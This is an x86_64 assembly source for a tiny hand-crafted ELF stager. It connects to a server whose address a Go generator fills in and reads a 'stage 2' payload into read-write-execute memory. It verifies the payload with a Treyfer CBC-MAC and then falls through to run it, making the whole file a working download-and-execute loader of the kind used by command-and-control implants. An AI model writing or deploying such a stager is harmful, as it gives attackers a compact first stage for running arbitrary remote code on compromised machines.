[bits 64]

; Virtual address at which we request our ELF to be mapped into memory. This is
; somewhat arbitrary, but we don't want it to be 0, and it's probably good to
; keep it page-aligned.
file_load_va: equ 4096 * 40

stage2_payload_size: equ STAGE_2_PAYLOAD_SIZE

; Treyfer constants
treyfer_sbox: equ file_load_va
treyfer_numrounds: equ 32

; ELF header

; Signature
db 0x7f, 'E', 'L', 'F'
; "Class" = 2, 64-bit
db 2
; Endianness = 1, little
db 1
; ELF version = 1
db 1
; OS ABI, unused, should be 0
db 0
; Extended ABI byte + 7 bytes padding. Leave as 0, it's ignored
dq 0
; ELF file type. 2 = executable
dw 2
; Target architecture. 0x3e = x86_64
dw 0x3e
; Additional ELF version stuff. Leave as 1.
dd 1
; Entry point address.
dq entry_point + file_load_va
; Program header offset. We'll put it immediately after the ELF header.
dq program_headers_start
; Section header offset. We'll put it after the program headers.
dq 0
; More flags. Not used, as far as I know.
dd 0
; Size of this header, 64 bytes.
dw 64
; Size of a program header entry.
dw 0x38
; Number of program header entries.
dw 1
; Size of a section header entry.
dw 0x40
; Number of section header entries
dw 0
; Index of the section containing the string table with section names
dw 0


program_headers_start:
; First field: The program header type. 1 = loadable segment.
dd 1
; Program header flags. 7 = rwx. (bits 0, 1, and 2 = executable,
; writable, and readable, respectively)
dd 7
; The offset of the loadable segment in the file. This will contain the entire
; file, so make it 0.
dq 0
; The VA to place the segment at.
dq file_load_va
; The "physical address". Don't think it's used, set to same as VA.
dq file_load_va
; The size of the segment in the file.
dq file_end
; The size of the segment in memory.
dq sockaddr + stage2_payload_size ; allocate some extra memory
; The alignment of the segment
dq 0x200000


; Now we're past all the program and section headers. The actual code goes here
entry_point:
  ; Create socket
  xor eax, eax                   ; eax = 41: syscall number for socket
  mov al, 41
  mov edi, 2                     ; edi = 2: AF_INET
  mov esi, 1                     ; esi = 1: SOCK_STREAM
  xor edx, edx                   ; edx = 0: protocol (0 for IP)
  syscall

  ; Back up socket file descriptor
  mov r15, rax

  ; Connect to the server
  mov edi, eax                   ; edi = Socket file descriptor
  mov esi, file_load_va + sockaddr ; esi = Pointer to sockaddr structure
  xor edx, edx                   ; edx = 16: Size of sockaddr structure
  mov dl, 16
  xor eax, eax                   ; eax = 42: syscall number for connect
  mov al, 42                     
  syscall

  mov edx, stage2_payload_size
read_loop_start:
  ; Read from server file descriptor
  xor eax, eax                   ; read = syscall 0
  ; edi already equals socket file descriptor
  ; esi already points to our buffer
  syscall
  
  sub edx, eax
  add esi, eax

  cmp edx, 0
  ja read_loop_start

  ; Calculate the treyfer cbc mac of the server's data
  mov rdi, stage2_payload_size >> 3
  mov rdx, file_load_va + sockaddr

cbc_mac__loop_cond:
  cmp rdi, 0
  jle verify_cbc_mac

  ; xor with previous
  mov rax, qword [rdx]
  mov rbx, qword [file_load_va + treyfer_cbc_mac_iv_and_result]
  xor rax, rbx
  mov qword [file_load_va + treyfer_cbc_mac_iv_and_result], rax

  ; encrypt (inlined function)
; rsi = i
; rax = t
; rcx = temporary
encrypt_block:
  xor rax, rax
  xor rcx, rcx

; unsigned i = 0;
  mov rsi, 0
; uint8_t t = text[0];
  mov al, byte [file_load_va + treyfer_cbc_mac_iv_and_result]

; while (i < 8*NUMROUNDS) {
encrypt_block__loop_cond:
  cmp rsi, 8*treyfer_numrounds
  jae encrypt_block__finish

;     t += key[i%8];
  mov cl, sil ; rcx = i % 8
  and rcx, 0x07
  add al, byte [file_load_va + treyfer_key + rcx] ; rax += key[rcx]
  and rax, 0xff

;     t = sbox[t];
  mov al, byte [treyfer_sbox + rax] ; rax = sbox[rax]

;     unsigned next_i = (i+1) % 8;
  inc rcx
  and rcx, 0x07

;     t += text[next_i];
  add al, byte [file_load_va + treyfer_cbc_mac_iv_and_result + rcx]

;     t = (t << 1) | (t >> 7);        /* Rotate left 1 bit */
  rol al, 1

;     text[next_i] = t;
  mov byte [file_load_va + treyfer_cbc_mac_iv_and_result + rcx], al

;     i++;
  inc rsi
  jmp encrypt_block__loop_cond
; }
encrypt_block__finish:

  add rdx, 8 ; increment text pointer by 8
  dec rdi ; decrement length by 1
  jmp cbc_mac__loop_cond

; This is placed down here to be out of the sbox range (hopefully)
treyfer_key:
  dq 0x4141414141414141 ; key is set in golang

treyfer_cbc_mac_iv_and_result: ; 0x2812f
  dq 0x4242424242424242 ; initial value is IV. set in golang
  ; it is important the IV is secret from anyone intercepting packets
  ;  as otherwise they may be able to crack the key using bruteforce

treyfer_cbc_mac_expected_result:
  dq 0x4343434343434343 ; expected value to validate with

verify_cbc_mac:
  mov rax, qword [file_load_va + treyfer_cbc_mac_iv_and_result]
  mov rbx, qword [file_load_va + treyfer_cbc_mac_expected_result]

  cmp rax, rbx
  je verify_success
  int3 ; Terminate the program with sigtrap

verify_success:

; struct sockaddr_in {
;     sa_family_t     sin_family;     /* AF_INET */
;     in_port_t       sin_port;       /* Port number */
;     struct in_addr  sin_addr;       /* IPv4 address */
; };
sockaddr:
  ; AF_INET
  dw 2
  ; ---
  ; ; port number
  ; dw 0x2923 ; 9001 in big endian
  ; ; address (currently 127.0.0.1)
  ; dd 0x0100007f
  ; ---
  ; Port number and address to be replaced by generator
  db 0x01, 0x02, 0x03, 0x04, 0x05, 0x06

file_end: